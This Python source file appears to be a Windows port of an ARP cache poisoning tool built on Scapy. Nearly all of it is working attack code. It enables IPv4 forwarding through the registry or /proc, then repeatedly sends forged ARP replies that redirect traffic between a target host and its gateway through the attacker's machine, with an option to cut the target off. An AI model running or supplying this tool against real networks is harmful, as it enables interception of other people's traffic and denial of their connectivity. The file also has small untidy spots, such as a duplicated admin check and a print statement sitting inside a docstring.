# windows_spoofer_full.py
import argparse
import os
import time
import sys
import ctypes
import winreg
from typing import Iterable
import platform

# Scapy imports
from scapy.all import Ether, ARP, sendp, conf, Packet

# keep using your ARPSetupProxy class
from packets import ARPSetupProxy

# ---- Helpers ----
def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def enable_windows_ipv4_forwarding() -> bool:
    """
    print(r"Try to set the registry key HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter = 1")
    Returns True if set successfully, False otherwise.
    Note: On many Windows installs a reboot is required for the change to take full effect.
    """
    try:
        key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        return True
    except PermissionError:
        print('[!] Permission denied: cannot modify registry. Run as Administrator to enable forwarding.')
        return False
    except Exception as e:
        print(f'[!] Failed to set IPEnableRouter registry key: {e}')
        return False

def is_raw_frame(obj) -> bool:
    """Return True if obj looks like a raw Ethernet frame (bytes/bytearray)."""
    return isinstance(obj, (bytes, bytearray))

def iterable_of_packets(obj) -> bool:
    """Return True if object is iterable and looks like a collection of packets."""
    if obj is None:
        return False
    if isinstance(obj, (bytes, bytearray, str)):
        return False
    try:
        iter(obj)
        return True
    except TypeError:
        return False


# Windows-only imports for IPv4 forwarding toggle
if os.name == 'nt':
    try:
        import winreg
    except Exception:
        winreg = None


class Spoofer(object):
    def __init__(self, *, interface: str, attackermac: str,
                 gatewaymac: str, gatewayip: str, targetmac: str, targetip: str,
                 interval: float, disassociate: bool, ipforward: bool):
        self.__interval = interval
        self.__ipv4_forwarding = ipforward
        self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                   gatewayip, targetmac, targetip,
                                   disassociate)
        self.__disassociate = disassociate

    def execute(self):
        # Basic environment checks
        if platform.system().lower() != 'windows':
            print('[!] Warning: this script is tailored for Windows (Scapy + Npcap).')
        # Try to toggle IPv4 forwarding on Windows if requested
        try:
            self.__check_ipv4_forwarding()
        except Exception as e:
            print(f'[!] Could not toggle IPv4 forwarding: {e}')

        self.__display_setup_prompt()
        try:
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise SystemExit('\n[!] ARP Spoofing attack aborted by user.')

    def __check_ipv4_forwarding(self):
        """
        On Linux this edited /proc/sys/net/ipv4/ip_forward.
        On Windows we set HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter = 1
        Note: changing this usually requires elevated privileges and may require reboot.
        """
        if not self.__ipv4_forwarding:
            return

        if os.name == 'nt':
            if winreg is None:
                raise RuntimeError('winreg module not available; cannot modify registry.')
            try:
                key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
                with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hklm:
                    with winreg.OpenKey(hklm, key_path, 0, winreg.KEY_SET_VALUE) as key:
                        # Set IPEnableRouter to 1
                        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                print("[*] Windows registry IPEnableRouter set to 1. A reboot or service restart may be required for changes to take effect.")
            except PermissionError:
                raise PermissionError("Requires Administrator privileges to write to registry.")
            except Exception as exc:
                raise RuntimeError(f"Failed to set IPEnableRouter: {exc}")
        else:
            # Linux behavior preserved for completeness
            config = '/proc/sys/net/ipv4/ip_forward'
            try:
                with open(config, mode='r+', encoding='utf_8') as config_file:
                    line = next(config_file)
                    config_file.seek(0)
                    config_file.write(line.replace('0', '1'))
                print('[*] /proc/sys/net/ipv4/ip_forward set to 1')
            except PermissionError:
                raise PermissionError("Requires root privileges to change /proc/sys/net/ipv4/ip_forward.")
            except Exception as exc:
                raise RuntimeError(f"Failed to modify {config}: {exc}")

    def __display_setup_prompt(self):
        print('\n[>>>] ARP Spoofing configuration (Windows / Scapy):')
        pk = self.__arp.packets
        configurations = {'Interface': self.__arp.interface,
                          'Attacker MAC': getattr(pk, 'attacker_mac', 'unknown'),
                          'Gateway IP': getattr(pk, 'gateway_ip', 'unknown'),
                          'Gateway MAC': getattr(pk, 'gateway_mac', 'unknown'),
                          'Target IP': getattr(pk, 'target_ip', 'unknown'),
                          'Target MAC': getattr(pk, 'target_mac', 'unknown'),
                          'IPv4 Forwarding (requested)': str(self.__ipv4_forwarding),
                          'Disassociate flag': str(self.__disassociate)}

        for setting, value in configurations.items():
            print('{0: >7} {1: <20}{2:.>25}'.format('[+]', setting, value))

        while True:
            proceed = input('\n[!] ARP packets ready. Execute the attack with these settings? (Y/N) ').lower()
            if proceed == 'y':
                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt

    def __send_frame(self, frame):
        """
        Send a single frame. Accepts:
          - bytes/bytearray: treated as full Ethernet frame
          - scapy Packet: sent directly
          - anything else: ignored with a warning
        """
        # bytes/bytearray -> wrap in Ether() to parse the raw bytes as Ethernet frame
        if isinstance(frame, (bytes, bytearray)):
            try:
                pkt = Ether(frame)
            except Exception:
                # If parsing fails, try sending raw payload inside Ether (best-effort)
                pkt = Ether() / frame
            sendp(pkt, iface=self.__arp.interface, verbose=False)
            return

        # If it's already a Scapy packet (Ether/ARP/...), send it directly
        if isinstance(frame, Packet):
            sendp(frame, iface=self.__arp.interface, verbose=False)
            return

        # If it's a tuple/list of bytes (or other), attempt to send each element
        if isinstance(frame, (list, tuple)):
            for f in frame:
                self.__send_frame(f)
            return

        print('[!] Warning: unknown frame type, skipping:', type(frame))

    def __send_attack_packets(self):
        """
        Main sending loop. Priority:
        1) If ARPSetupProxy.packets yields raw Ethernet frames (bytes), send them.
        2) Otherwise, construct ARP replies (gateway<-attacker, target<-attacker) and send those.
        3) If disassociate mode and ARPSetupProxy provides extra frames, send them as well.
        """
        conf.iface = self.__arp.interface
        conf.verb = 0  # quiet scapy

        pk = self.__arp.packets

        # Try to detect raw frames in pk: iterable of bytes/bytearray
        raw_iterable = False
        try:
            if hasattr(pk, '__iter__') and not isinstance(pk, (str, bytes, bytearray)):
                # peek first element safely
                for first in pk:
                    if isinstance(first, (bytes, bytearray)):
                        raw_iterable = True
                    break
        except Exception:
            raw_iterable = False

        # If raw frames are provided, use them
        if raw_iterable:
            print('[*] Detected raw frames from ARPSetupProxy; sending raw Ethernet frames.')
            while True:
                for frame in pk:
                    self.__send_frame(frame)
                time.sleep(self.__interval)

        # Otherwise, attempt to extract fields and build ARP replies
        attacker_mac = getattr(pk, 'attacker_mac', None)
        gateway_mac = getattr(pk, 'gateway_mac', None)
        gateway_ip = getattr(pk, 'gateway_ip', None)
        target_mac = getattr(pk, 'target_mac', None)
        target_ip = getattr(pk, 'target_ip', None)

        if None in (attacker_mac, gateway_mac, gateway_ip, target_mac, target_ip):
            print('[!] ARP packet details incomplete. Checking for alternate packet sources...')
            # As a last fallback, if pk itself is a single scapy Packet or bytes, try sending that repeatedly
            if isinstance(pk, (bytes, bytearray, Packet)):
                print('[*] Sending single provided packet repeatedly.')
                while True:
                    self.__send_frame(pk)
                    time.sleep(self.__interval)
            raise SystemExit('[!] Insufficient packet information to construct ARP replies.')

        # Build ARP reply packet to poison the target's ARP cache: claim gateway_ip is at attacker_mac
        arp_to_target = Ether(dst=target_mac, src=attacker_mac) / ARP(op=2,
                                                                       hwsrc=attacker_mac,
                                                                       psrc=gateway_ip,
                                                                       hwdst=target_mac,
                                                                       pdst=target_ip)
        # Build ARP reply packet to poison the gateway's ARP cache: claim target_ip is at attacker_mac
        arp_to_gateway = Ether(dst=gateway_mac, src=attacker_mac) / ARP(op=2,
                                                                        hwsrc=attacker_mac,
                                                                        psrc=target_ip,
                                                                        hwdst=gateway_mac,
                                                                        pdst=gateway_ip)

        print('[*] Starting ARP poisoning on interface:', self.__arp.interface)
        while True:
            # Send both spoofed replies to keep ARP caches poisoned
            sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
            sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)

            # If ARPSetupProxy provides extra frames (e.g., disassociate frames), attempt to send them
            extras = getattr(pk, 'extras', None) or getattr(pk, 'disassociate_frames', None)
            if self.__disassociate and extras:
                # support either iterable of bytes or scapy Packets
                if isinstance(extras, (list, tuple)):
                    for extra in extras:
                        self.__send_frame(extra)
                else:
                    self.__send_frame(extras)

            time.sleep(self.__interval)

def is_admin():
    if sys.platform == 'win32':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    return os.getuid() == 0  # Works on Unix systems like Linux and macOS

if not is_admin():
    print("You need to run this script with elevated (admin) privileges.")
else:
    print("You have the necessary privileges.")

if __name__ == '__main__':
    is_admin()

    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    options = parser.add_mutually_exclusive_group()
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatewaymac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gatewayip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 1 second).')
    options.add_argument('-d', '--disassociate', action='store_true',
                         help='Execute a disassociation attack in which a '
                              'randomized MAC address is set for the attacker '
                              'machine, effectively making the target host '
                              'send packets to a non-existent gateway.')
    options.add_argument('-f', '--ipforward', action='store_true',
                         help='Temporarily enable forwarding of IPv4 packets '
                              'on the attacker system until the next reboot. '
                              'Set this to intercept information between the '
                              'target host and the gateway, performing a '
                              'man-in-the-middle attack. Requires '
                              'administrator privileges.')
    cli_args = parser.parse_args()
    spoofer = Spoofer(**vars(cli_args))
    spoofer.execute()
